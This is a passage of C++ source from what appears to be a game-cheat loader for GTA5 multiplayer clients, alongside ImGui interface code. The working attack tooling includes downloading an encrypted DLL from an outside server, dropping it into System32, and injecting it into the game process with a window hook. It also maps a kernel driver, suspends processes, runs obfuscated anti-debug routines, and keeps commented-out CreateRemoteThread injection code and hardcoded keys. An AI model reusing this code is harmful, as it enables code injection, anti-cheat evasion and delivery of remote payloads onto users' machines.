	LI_FN(sprintf)(request, /*ALTV_INJECT.php*/ xor_a("https://amph.su/client/ALTV_INJECT.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), aes::encrypt("Alt:V Inject Cheat", tempory_cipher_key, tempory_iv_key).c_str());



	CURL* curl;
	CURLcode res;
	std::string response;
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, request);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}

	if (response == aes::encrypt(xor_a("file_error"), tempory_cipher_key, tempory_iv_key)) {
		printf(xor_a("_error!\n"));
		system("pause");
		return ;
	}
	for (int i = 0; i < response.size(); i++)
		response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];

	CreateFileFromMemory(xorstr_("C:\\Windows\\System32\\JkfgirtN.dll"), response.data(), response.size());





	






	LPCSTR dllPath = xorstr_("C:\\Windows\\System32\\JkfgirtN.dll");

	if (GetFileAttributes(dllPath) == INVALID_FILE_ATTRIBUTES) {
		cout << "[ FAILED ] DLL file does not exist." << endl;
		system("pause");
		return ;
	}

	HWND hwnd = FindWindowW(L"grcWindow", NULL); //Game window classname
	if (hwnd == NULL) {
		cout << "[ FAILED ] Could not find target window." << endl;
		system("pause");
		return ;
	}

	// Getting the thread of the window and the PID
	DWORD pid = NULL;
	DWORD tid = GetWindowThreadProcessId(hwnd, &pid);
	if (tid == NULL) {
		cout << "[ FAILED ] Could not get thread ID of the target window." << endl;
		system("pause");
		return ;
	}

	// Loading DLL
	HMODULE dll = LoadLibraryEx(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES); //Loading dll from params
	if (dll == NULL) {
		cout << "[ FAILED ] The DLL could not be found." << endl;
		system("pause");
		return ;
	}

	// Getting exported function address
	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "gfdgKJdf"); //export see dllmain.cpp "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam)
	if (addr == NULL) {
		cout << "[ FAILED ] The function was not found." << endl;
		system("pause");
		return ;
	}

	// Setting the hook in the hook chain
	HHOOK handle = SetWindowsHookEx(WH_GETMESSAGE, addr, dll, tid); // Or WH_KEYBOARD if you prefer to trigger the hook manually
	if (handle == NULL) {
		cout << "[ FAILED ] Couldn't set the hook with SetWindowsHookEx." << endl;
		system("pause");
		return ;
	}

	// Triggering the hook
	PostThreadMessage(tid, WM_NULL, NULL, NULL);

	// Waiting for user input to remove the hook
	cout << "[ OK ] Hook set and triggered." << endl;
	cout << "[ >> ] Press any key to unhook (This will unload the DLL)." << endl;
	//system("pause > nul");

	//// Unhooking
	//BOOL unhook = UnhookWindowsHookEx(handle);
	//if (unhook == FALSE) {
	//	cout << "[ FAILED ] Could not remove the hook." << endl;
	//	system("pause");
	//	return ;
	//}

	//cout << "[ OK ] Done. Press any key to exit." << endl;
	//system("pause > nul");
	//return ;








	//Inject* inject = new Inject();
	//if (!inject->inject_module_from_path_to_process_by_name((L"GTA5.exe"), 3)) {
	//	std::cout << "Error bool" << std::endl;
	//	system("pause");
	//}













	//HANDLE hProc = OpenProc("GTA5.exe");
	//if (!hProc)
	//	return 0;

	//ManualMap(hProc);

	//CloseHandle(hProc);



	//std::string tempory_cipher_key;
	//std::string tempory_iv_key;
	//std::vector<std::string> vector_tempory_key;
	//char request[512];
	//li(sprintf)(request, xorstr_("https://amph.su/client/session.php"));
	//std::string unprotect_request;
	//CURL* curlq;
	//CURLcode resq;
	//curlq = curl_easy_init();
	//if (curlq) {
	//	curl_easy_setopt(curlq, CURLOPT_URL, request);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEFUNCTION, WriteCallback);
	//	curl_easy_setopt(curlq, CURLOPT_WRITEDATA, &unprotect_request);
	//	resq = curl_easy_perform(curlq);
	//	curl_easy_cleanup(curlq);
	//}
	//unprotect_request = aes::decrypt(unprotect_request, xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q"));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 64)
	//	tempory_cipher_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//for (std::size_t pos = 0; pos < unprotect_request.size(); pos += 32)
	//	tempory_iv_key = vector_tempory_key.emplace_back(unprotect_request.data() + pos, unprotect_request.data() + min(pos + 32, unprotect_request.size()));
	//std::string protect_request = aes::encrypt(unprotect_request.c_str(), tempory_cipher_key, tempory_iv_key);
	//std::string protect_username = aes::encrypt(Global::client.username, tempory_cipher_key, tempory_iv_key);
	//std::string protect_password = aes::encrypt(Global::client.password, tempory_cipher_key, tempory_iv_key);
	////std::string protect_pornushka = aes::encrypt(pornushka, tempory_cipher_key, tempory_iv_key);
	//std::string protect_pornushka = aes::encrypt("INJECTOR", tempory_cipher_key, tempory_iv_key);
	//unprotect_request = aes::encrypt(unprotect_request.c_str(), xorstr_("r09y7LrY1C4yqONI641qMQe7GA5mQvdf"), xorstr_("H1ggF9foFGLerr8q")); // static keys	
	//li(sprintf)(request, xorstr_("https://amph.su/client/ragemp_injector.php?a=%s&b=%s&username=%s&password=%s&porrno228=%s"), unprotect_request.c_str(), protect_request.c_str(), protect_username.c_str(), protect_password.c_str(), protect_pornushka.c_str());
	//std::string response;
	//CURL* curl = curl_easy_init();
	//curl_easy_setopt(curl, CURLOPT_URL, request);
	//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
	//CURLcode CURLresult = curl_easy_perform(curl);
	//curl_easy_cleanup(curl);
	//if (CURLresult != CURLE_OK) {
	//	std::cout << "Error [Cant get cheat DLL]" << std::endl;
	//	Sleep(9999);
	//}
	//if (response == aes::encrypt(xorstr_("file_error"), tempory_cipher_key, tempory_iv_key))
	//	return false;
	//for (int i = 0; i < response.size(); i++)
	//	response[i] = response[i] ^ Crypt::Key[i % (sizeof(Crypt::Key) / sizeof(char))];

	//RunExeFromMemory(Injectoralt);
	//return true;


	//system("pause");


	//return true;

}


bool flkdghmljfdghkgdmfh = false;
void start_driver()
{

	//kernelHandler.attach();

	//if (!kernelHandler.is_loaded())
	//if(!flkdghmljfdghkgdmfh)
	//{
	//	cout << xor_a("[+] Loading drivers...") << endl;
	//	map_driver();
	//	flkdghmljfdghkgdmfh = true;
	//}

	if (!injecttruehihihaharagemp)
	{
		map_driver();
		//Beep(500, 500);
	}
	else {
		li(MessageBoxA)(NULL, xorstr_("Driver error"), xorstr_("Driver"), MB_ICONERROR);
	}
	//kernelHandler.attach();
	//kernelHandler.is_loaded() ? Beep(500, 500) : li(MessageBoxA)(NULL, xorstr_("Driver error"), xorstr_("Driver"), MB_ICONERROR) ;
	//cout << endl;
}


int TabAUTH = 0;

#include "ImGui/imgui.h"
ImFont* name3 = nullptr;
ImFont* name2343 = nullptr;
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
//ImVec4 blue = ImColor(255, 22, 192);

#define _CRT_SECURE_NO_WARNINGS

#include "ImGui/imgui.h"
#include "ImGui/imgui_impl_win32.h"
#include "ImGui/imgui_impl_dx11.h"
#include "ImGui/imgui_internal.h"
#include "ImGui/imgui_freetype.h"
#include <d3d11.h>

#include "Bytes.h"
#include <D3DX11tex.h>
//#pragma comment(lib, "d3dcompiler.lib")
#pragma comment(lib, "d3d11.lib")

#pragma comment(lib, "d3dx11.lib")


#include "ImGui/imgui_freetype.h"
#pragma comment(lib,"dxguid.lib")
#include "ImGui/ResourceManager.h"
#include "ImGui/Vector.hpp"
#include "iconrust.h"

#include <processthreadsapi.h>
//#include <WinInet.h> 
#pragma comment(lib, "dwmapi.lib")
//#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

#include <string>
#include <array>
#include <utility>
#include <cstdarg>
#include <string>
#include <vector>
#include <Windows.h>
#include <direct.h>
#include"../amthloader/imgui_settings.h"
static ID3D11Device* g_pd3dDevice = nullptr;
static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
static IDXGISwapChain* g_pSwapChain = nullptr;
static UINT                     g_ResizeWidth = 0, g_ResizeHeight = 0;
static ID3D11RenderTargetView* g_mainRenderTargetView = nullptr;



using namespace ImGui;
static int anim[3];
ImVec2 pos;
ImVec2 position;
ImDrawList* draw;
//extern ImColor blue;

void ProcessResume(const char* processName)
{
	DWORD PID = find_process(processName);
	HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, PID);
	if (!hProcess) {
		printf("OpenProcess failed. ErrorCode:0x%08X\n", GetLastError());
		return;
	}

	NtResumeProcess _NtResumeProcess = (NtResumeProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtResumeProcess");

	_NtResumeProcess(hProcess);

	CloseHandle(hProcess);

	return;
}

void ProcessSuspend(const char* processName)
{
	DWORD PID = find_process(processName);
	HANDLE hProcess = LI_FN(OpenProcess)(PROCESS_SUSPEND_RESUME, FALSE, PID);

	if (!hProcess)
	{
		DWORD dwordVar = LI_FN(GetLastError)();
		std::stringstream ss;
		ss << dwordVar;
		printf("OpenProcess failed. ErrorCode:0x%08X\n", GetLastError());
		return;
	}

	NtSuspendProcess _NtSuspendProcess = (NtSuspendProcess)LI_FN(GetProcAddress)(LI_FN(GetModuleHandleA)(xorstr_("ntdll")), xorstr_("NtSuspendProcess"));

	_NtSuspendProcess(hProcess);

	LI_FN(CloseHandle)(hProcess);
}



#pragma warning( disable : 4244 )

#include <ShlObj_core.h>


HWND window = nullptr;
bool initq, show = true;


int dostupnaauth = 0;

void res(std::string dir, std::string json)
{
	std::ifstream fin(json);
	std::ofstream fout(dir + "\\Settings.json");

	std::string line;
	while (std::getline(fin, line))
		fout << line << '\n';

	fout.close();
}


__forceinline void DebugSelf()
{
	HANDLE hProcess = NULL;
	DEBUG_EVENT de;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&de, sizeof(DEBUG_EVENT));

	GetStartupInfo(&si);

	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);
	CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, CREATE_SECURE_PROCESS, NULL, NULL, &si, &pi);

	ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_TERMINATE_PROCESS);

	WaitForDebugEvent(&de, INFINITE);
}

int dw1 = 655;
int dw2 = 40;
int dw3 = 180;
int dw4 = 210;
int dw5 = 1;
int dw6 = 1;
int dw7 = 1;
int dw8 = 1;
static char username[64] = { 0 };
static char password[64] = { 0 };






void download_dll(const char* dllLink, const char* dllPath)
{
	URLDownloadToFileA(0, dllLink, dllPath, 0, 0);
	DeleteUrlCacheEntryA(dllLink);
}


const char* alphabet = "mnbvcxzlkjhgfdsapoiuytrewq0123456789";

//bool inject(const char* process_name)
//{
//
//	std::string EndFile = getenv("APPDATA");
//	EndFile += xorstr_("\\");
//	EndFile += xorstr_("system32.dll");
//	string link = xorstr_("https://") + Globals::server_side.server + xorstr_("/client/download.php?key=") + Globals::server_side.secret_key;
//	WebClient::DownloadFile(link.c_str(), EndFile.c_str());
//	DWORD proc_id = 0;
//	while (!proc_id)
//	{
//		proc_id = getProcID(process_name);
//		Sleep(30);
//	}
//	auto* const h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, proc_id);
//	if (h_proc && h_proc != INVALID_HANDLE_VALUE)
//	{
//		const LPVOID nt_open_file = GetProcAddress(LoadLibraryW(L"ntdll"), "NtOpenFile");//ggez
//		if (nt_open_file)
//		{
//			char original_bytes[5];
//			memcpy(original_bytes, nt_open_file, 5);
//			WriteProcessMemory(h_proc, nt_open_file, original_bytes, 5, nullptr);
//		}
//		auto* loc = VirtualAllocEx(h_proc, nullptr, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//		WriteProcessMemory(h_proc, loc, EndFile.c_str(), strlen(EndFile.c_str()) + 1, nullptr);
//		auto* const h_thread = CreateRemoteThread(h_proc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), loc, 0, nullptr);
//		if (h_thread) 
//			CloseHandle(h_thread);
//	}
//	if (h_proc) 
//		CloseHandle(h_proc);
//	return 0;
//}	


__forceinline std::string banuser()
{
	char request[512];

	std::string key = aes::encrypt(g_globals.client_side.data.key.c_str(), g_globals.server_side.key.cipher, g_globals.server_side.key.iv);
	std::string hwid; //= aes::encrypt(g_globals.client_side.data.hwid.c_str(), g_globals.server_side.key.cipher, g_globals.server_side.key.iv);

	li(sprintf)(request, xorstr_("/api/banuser.php?a=%s&b=%s"), key.c_str(), hwid.c_str());
	std::string response = utilities::request_to_server(g_globals.server_side.ip, request);

	return response;
}

__forceinline void BanThread()
{
	while (true)
	{
		if (uLoader::globalbanshwid(xorstr_("0")) == 1)
		{
			sec::clown();
			raise(11);
		}
		Sleep(5000);
	}
}


bool rememberme = true;
bool remembermeq = true;

void AddCircleImageFilled(ImTextureID user_texture_id, const ImVec2& centre, float radius, ImU32 col, int num_segments)
{
	auto window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return;

	ImGuiContext& g = *GImGui;
	window->DrawList->PathClear();

	if ((col & IM_COL32_A_MASK) == 0 || num_segments <= 2)
		return;


	const bool push_texture_id = window->DrawList->_TextureIdStack.empty() || user_texture_id != window->DrawList->_TextureIdStack.back();
	if (push_texture_id)
		window->DrawList->PushTextureID(user_texture_id);

	int vert_start_idx = window->DrawList->VtxBuffer.Size;
	const float a_max = IM_PI * 2.0f * ((float)num_segments - 1.0f) / (float)num_segments;
	window->DrawList->PathArcTo(centre, radius, 0.0f, a_max, num_segments - 1);
	window->DrawList->PathFillConvex(col);
	int vert_end_idx = window->DrawList->VtxBuffer.Size;

	ImGui::ShadeVertsLinearUV(window->DrawList, vert_start_idx, vert_end_idx, ImVec2(centre.x - radius, centre.y - radius), ImVec2(centre.x + radius, centre.y + radius), ImVec2(0, 0), ImVec2(1, 1), true);

	if (push_texture_id)
		window->DrawList->PopTextureID();
}
float gdfshfdsgh = 1.f;
float ghjdjhfgjhgfjghfjgh = 1.f;

bool show_popup = false;
static int timer = 0;
static int alpha = 0;
static int alpha2 = 0;
float tab_size = 0.f;
ImFont* medium = nullptr;
#include<__msvc_chrono.hpp>
namespace font
{
	ImFont* poppins_medium = nullptr;
	ImFont* poppins_medium_low = nullptr;
	ImFont* tab_icon = nullptr;
	ImFont* chicons = nullptr;
	ImFont* tahoma_bold = nullptr;
	ImFont* tahoma_bold2 = nullptr;
}
namespace notification
{
	long getMils()
	{
		auto duration = std::chrono::system_clock::now().time_since_epoch();

		return std::chrono::duration_cast<std::chrono::seconds>(duration).count();
	}

	ImVec2 position;
	ImDrawList* draw;

	bool BufferingBar(const char* label, float value, const ImVec2& size_arg, const ImU32& bg_col, const ImU32& fg_col) {
		ImGuiWindow* window = ImGui::GetCurrentWindow();
		if (window->SkipItems)
			return false;
		ImGuiContext& g = *GImGui;
		const ImGuiStyle& style = g.Style;
		const ImGuiID id = window->GetID(label);
		ImVec2 pos = window->DC.CursorPos;
		ImVec2 size = size_arg;
		size.x -= style.FramePadding.x * 2;
		const ImRect bb(pos, ImVec2(pos.x + size.x, pos.y + size.y));
		ImGui::ItemSize(bb, style.FramePadding.y);
		if (!ImGui::ItemAdd(bb, id))
			return false;
		const float circleStart = size.x * (timer / 5000.f);
		const float circleEnd = size.x;
		const float circleWidth = circleEnd - circleStart;
		window->DrawList->AddRectFilled(bb.Min, ImVec2(pos.x + circleStart, bb.Max.y), bg_col);
		window->DrawList->AddRectFilled(bb.Min, ImVec2(pos.x + circleStart * value, bb.Max.y), fg_col);
		const float t = g.Time;
		const float r = size.y / 2;
		const float speed = 1.5f;
		const float a = speed * 0;
		const float b = speed * 0.333f;
		const float c = speed * 0.666f;
